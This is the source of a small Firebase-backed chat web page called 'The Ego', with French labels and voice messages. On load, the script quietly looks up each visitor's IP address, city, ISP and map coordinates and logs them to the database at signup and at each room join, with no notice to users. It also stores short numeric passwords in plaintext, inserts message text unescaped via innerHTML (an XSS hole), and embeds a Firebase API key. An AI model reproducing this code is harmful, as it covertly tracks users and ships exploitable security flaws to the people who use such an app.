<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Ego | Security Project</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        :root { --primary: #fff; --bg: #000; --panel: #111; --red: #ff3b30; }
        body { background: var(--bg); color: #ccc; font-family: sans-serif; height: 100vh; margin: 0; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        .container { width: 90%; max-width: 450px; background: var(--panel); padding: 25px; border: 1px solid #333; border-radius: 12px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
        h1 { color: var(--primary); letter-spacing: 2px; font-weight: 300; margin-bottom: 20px; }
        input { background: #1a1a1a; border: 1px solid #444; color: #fff; padding: 15px; margin: 10px 0; width: 85%; text-align: center; border-radius: 8px; outline: none; font-size: 16px; }
        button.main-btn { background: var(--primary); color: #000; border: none; padding: 15px; width: 92%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        
        #chat-interface { display: none; height: 92vh; flex-direction: column; padding: 15px; }
        #messages { flex: 1; overflow-y: auto; background: #050505; border: 1px solid #222; margin: 10px 0; padding: 10px; border-radius: 8px; text-align: left; }
        .msg { margin-bottom: 10px; padding: 8px; background: #1f1f1f; border-radius: 6px; }
        .sender { color: #888; font-size: 0.75em; display: block; margin-bottom: 4px; }
        
        .controls { display: flex; gap: 5px; }
        .mic-btn { width: 50px; background: #333; border: none; color: #fff; border-radius: 8px; cursor: pointer; }
        .mic-btn.recording { background: var(--red); animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div id="auth-interface" class="container">
        <h1>THE EGO</h1>
        <p id="status-msg" style="color:var(--red); font-size:0.9em; height: 20px;"></p>

        <input type="text" id="username" placeholder="Nom (Lettres/Chiffres seulement)">
        <input type="password" id="user-pass" maxlength="5" placeholder="Mot de passe (3-5 chiffres)">
        <input type="number" id="room-code" placeholder="Code Room (4-9 chiffres)">
        
        <button class="main-btn" onclick="handleLogin()">CONNEXION</button>
    </div>

    <div id="chat-interface" class="container">
        <div style="color:#666; font-size:0.9em; margin-bottom:10px;">ROOM: <span id="room-display" style="color:#fff"></span></div>
        <div id="messages"></div>
        <div class="controls">
            <button class="mic-btn" id="rec-btn" onmousedown="startRec()" onmouseup="stopRec()" ontouchstart="startRec()" ontouchend="stopRec()">ğŸ¤</button>
            <input type="text" id="msg-input" placeholder="Message..." style="margin:0; width:100%;">
            <button onclick="sendMsg()" style="width:60px; background:#fff; border:none; border-radius:8px; cursor:pointer;">â¤</button>
        </div>
        <button onclick="location.reload()" style="background:none; border:none; color:#555; margin-top:10px; cursor:pointer;">Quitter</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBwRtHgM5cBTxci9ffzMOPp9POTTy-PbWE",
            authDomain: "theegochat.firebaseapp.com",
            databaseURL: "https://theegochat-default-rtdb.firebaseio.com", 
            projectId: "theegochat",
            storageBucket: "theegochat.firebasestorage.app",
            messagingSenderId: "256766104582",
            appId: "1:256766104582:web:90ce5a80e009d108529f87"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let currentUser = null, currentRoom = null;
        let locationData = { city: "Unknown", ip: "Unknown", map: "" };
        
        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ© (Ù„Ø§ ØªÙˆÙ‚Ù Ø§Ù„ØªØ·Ø¨ÙŠÙ‚)
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                locationData = {
                    city: data.city || "Unknown",
                    country: data.country_name || "Unknown",
                    ip: data.ip || "Hidden",
                    isp: data.org || "Unknown",
                    map: `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`
                };
            }).catch(e => console.log("Loc error (AdBlock?):", e));

        function handleLogin() {
            const status = document.getElementById('status-msg');
            // ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø§Ø³Ù… Ù…Ù† Ø§Ù„Ø±Ù…ÙˆØ² Ø§Ù„Ù…Ù…Ù†ÙˆØ¹Ø©
            let name = document.getElementById('username').value.trim();
            name = name.replace(/[.#$\[\]\/]/g, "_"); // Ø§Ø³ØªØ¨Ø¯Ø§Ù„ Ø§Ù„Ø±Ù…ÙˆØ² Ø§Ù„Ù…Ù…Ù†ÙˆØ¹Ø© Ø¨Ù€ _
            
            const pass = document.getElementById('user-pass').value.trim();
            const room = document.getElementById('room-code').value.trim();

            if (!name || pass.length < 3 || room.length < 4) {
                status.innerText = "DonnÃ©es invalides (Pass min 3, Room min 4)"; return;
            }

            status.innerText = "Connexion...";

            db.ref('users/' + name).once('value')
                .then(snapshot => {
                    if (snapshot.exists()) {
                        if (snapshot.val().password === pass) join(name, room);
                        else status.innerText = "Mot de passe incorrect!";
                    } else {
                        // Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯
                        db.ref('users/' + name).set({
                            password: pass,
                            last_loc: locationData,
                            created_at: Date.now()
                        }).then(() => join(name, room))
                          .catch(err => { alert("Error DB: " + err.message); status.innerText = "Erreur Base de DonnÃ©es"; });
                    }
                })
                .catch(err => {
                    // Ù‡Ù†Ø§ ÙŠØ¸Ù‡Ø± Ø§Ù„Ø®Ø·Ø£ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ Ø¥Ø°Ø§ ÙƒØ§Ù† Ù‡Ù†Ø§Ùƒ Ù…Ø´ÙƒÙ„Ø© ÙÙŠ Ø§Ù„ÙØ§ÙŠØ±Ø¨ÙŠØ³
                    console.error(err);
                    alert("Erreur Connexion: VÃ©rifiez votre internet ou les RÃ¨gles (Rules) Firebase.\n" + err.message);
                    status.innerText = "Erreur Connexion";
                });
        }

        function join(name, room) {
            currentUser = name; currentRoom = room;
            db.ref('rooms/' + room + '/logs').push({ user: name, loc: locationData, time: Date.now() });
            
            document.getElementById('auth-interface').style.display = 'none';
            document.getElementById('chat-interface').style.display = 'flex';
            document.getElementById('room-display').innerText = room;
            
            loadMsgs();
        }

        function sendMsg() {
            const inp = document.getElementById('msg-input');
            if(inp.value.trim()) push({ type:'text', content: inp.value });
            inp.value = "";
        }
        
        let recorder, chunks=[];
        async function startRec() {
            if(!navigator.mediaDevices) return alert("Micro non supportÃ©");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({audio:true});
                recorder = new MediaRecorder(stream);
                recorder.start();
                document.getElementById('rec-btn').classList.add('recording');
                chunks=[];
                recorder.ondataavailable = e => chunks.push(e.data);
            } catch(e) { alert("Micro bloquÃ©"); }
        }
        function stopRec() {
            if(recorder && recorder.state !== "inactive") {
                recorder.stop();
                document.getElementById('rec-btn').classList.remove('recording');
                recorder.onstop = () => {
                    const reader = new FileReader();
                    reader.readAsDataURL(new Blob(chunks, {type:'audio/webm;codecs=opus'}));
                    reader.onloadend = () => {
                        if(reader.result.length < 500000) push({type:'audio', content:reader.result});
                        else alert("Audio trop long");
                    }
                };
            }
        }

        function push(data) {
            db.ref('rooms/'+currentRoom+'/msgs').push({
                u: currentUser, t: data.type, c: data.content, time: firebase.database.ServerValue.TIMESTAMP
            });
        }

        function loadMsgs() {
            const box = document.getElementById('messages');
            db.ref('rooms/'+currentRoom+'/msgs').limitToLast(20).on('child_added', s => {
                const v = s.val();
                const d = document.createElement('div'); d.className = 'msg';
                const time = new Date(v.time).toLocaleTimeString();
                d.innerHTML = `<span class="sender">${v.u} - ${time}</span>` + 
                              (v.t==='text' ? v.c : `<audio controls src="${v.c}"></audio>`);
                box.appendChild(d); box.scrollTop = box.scrollHeight;
            });
        }
    </script>
</body>
</html>
